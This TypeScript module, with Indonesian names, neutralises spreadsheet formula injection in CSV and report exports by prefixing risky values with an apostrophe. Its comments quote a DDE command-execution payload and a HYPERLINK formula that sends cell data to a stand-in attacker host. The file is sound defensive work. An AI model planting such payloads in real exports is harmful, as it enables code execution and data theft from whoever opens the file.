// Formula injection, and the one rule every export in this system obeys.
//
// THE ATTACK. Excel, LibreOffice Calc and Google Sheets all treat a cell whose
// text begins with `=`, `+`, `-`, `@`, a tab or a carriage return as a FORMULA
// to evaluate, not as text to display. `=cmd|' /c calc'!A1` is a DDE payload
// that Excel offers to execute on open; `=HYPERLINK("https://evil/"&A2,"klik")`
// exfiltrates the neighbouring cell to an attacker's server with one click and
// no warning at all.
//
// WHY THIS SYSTEM IS EXPOSED. Every string that reaches a report cell here is
// typed by somebody: `mitra.nama_lengkap`, `mitra.alamat`, `mitra.nama_usaha`,
// a journal's `keterangan`, an officer's note on a proposal. None of those
// fields has, or should have, a "must not look like a formula" validation --
// refusing to register a partner because their business name starts with a
// minus sign would be absurd. So the defence belongs at the EXPORT boundary,
// which is where the text stops being data and starts being a document another
// program will interpret.
//
// WHAT IS DONE, AND WHY IT IS A PREFIX RATHER THAN A REMOVAL. The value is
// preserved in full and a single apostrophe is put in front of it. Every
// spreadsheet program reads a leading apostrophe as "the rest of this is
// literal text": the cell displays and exports as text, and no evaluation
// happens in any of the three. Deleting the leading `=` would silently change
// somebody's data; escaping it would still leave `=` first.
//
// A NORMAL VALUE IS NEVER TOUCHED. `PT Maju Jaya`, `Jl. Merdeka No. 1` and
// `-` inside a sentence all export byte for byte. The apostrophe appears only
// on a value that WOULD have been executed, so the cosmetic cost is paid
// exclusively by payloads.
//
// THIS IS NOT ONLY AN .xlsx CONCERN, and that is why it lives in core rather
// than in the workbook writer. An .xlsx string cell is `<is>`/`<v>` and never
// `<f>`, so it is already inert AS AN .xlsx -- but "Save As CSV" from Excel
// writes the cell's text out unquoted, and re-opening that CSV executes it.
// Mailing a CSV to an auditor is the ordinary workflow in this domain. So the
// rule is applied once, here, and both writers call it.

/**
 * The leading characters a spreadsheet evaluates.
 *
 * `\t` and `\r` are in the list and are the two people forget: a value that
 * begins with either is trimmed by the spreadsheet BEFORE the first-character
 * test, so `"\t=cmd|..."` is executed exactly as `"=cmd|..."` would be, and a
 * check that only looked at `teks[0] === "="` waves it straight through.
 */
export const AWALAN_FORMULA: readonly string[] = ["=", "+", "-", "@", "\t", "\r"];

/**
 * A FORMATTED NUMBER, in this product's Indonesian convention: an optional
 * minus, thousands separated by dots, an optional two-decimal tail after a
 * comma. Anchored at both ends, so anything with an operator, a space or a
 * letter in it fails.
 *
 * WHY THIS EXISTS. A negative rupiah begins with `-`, which is on the formula
 * list, so every negative figure in the system was exported as
 * `'-41.842.500,00`. In a workbook that apostrophe is invisible; in the HTML
 * and PDF statements, which are the ones handed upward, it printed on the face
 * of every negative total. Spec 16 scenario 20 asks whether the export is fit
 * to give to management, and a stray apostrophe on every loss is the kind of
 * detail that makes a reader doubt the figures beside it.
 *
 * Narrowing rather than switching off: `-41.842.500,00` pasted into a
 * spreadsheet is a negative number and nothing else. `-1+cmd|...` is not a
 * formatted number and is still prefixed, and so is every other payload,
 * because the pattern below admits no operator, no space and no letter.
 */
const POLA_ANGKA_TERFORMAT = /^-?\d{1,3}(\.\d{3})*(,\d+)?$/;

/** True when a spreadsheet would evaluate this text instead of displaying it. */
export function berpotensiFormula(teks: string): boolean {
  if (teks.length === 0) return false;
  if (!AWALAN_FORMULA.includes(teks[0]!)) return false;
  // Only `-` can begin a formatted number; `=`, `+`, `@`, tab and CR never do,
  // so the pattern is tried only where it can possibly match.
  return !POLA_ANGKA_TERFORMAT.test(teks);
}

/**
 * The exported form of a user-entered string. Idempotent in the only sense
 * that matters: applying it to already-safe text returns that text unchanged.
 *
 * Note it is NOT idempotent on a payload (`=x` -> `'=x` -> `'=x`), which is
 * correct: `'=x` no longer starts with a dangerous character, so the second
 * application is a no-op rather than a second apostrophe.
 */
export function netralkanFormula(teks: string): string {
  return berpotensiFormula(teks) ? `'${teks}` : teks;
}

/**
 * One CSV field, quoted and neutralised.
 *
 * Quoting alone is NOT a defence and that is the trap: Excel strips the
 * surrounding quotes while parsing and then evaluates the contents, so
 * `"=cmd|' /c calc'!A1"` runs. The apostrophe has to be inside the quotes.
 */
export function selCsv(teks: string): string {
  const aman = netralkanFormula(teks);
  return `"${aman.replace(/"/g, '""')}"`;
}

/** A whole CSV row, comma separated, every field neutralised and quoted. */
export function barisCsv(nilai: readonly string[]): string {
  return nilai.map(selCsv).join(",");
}
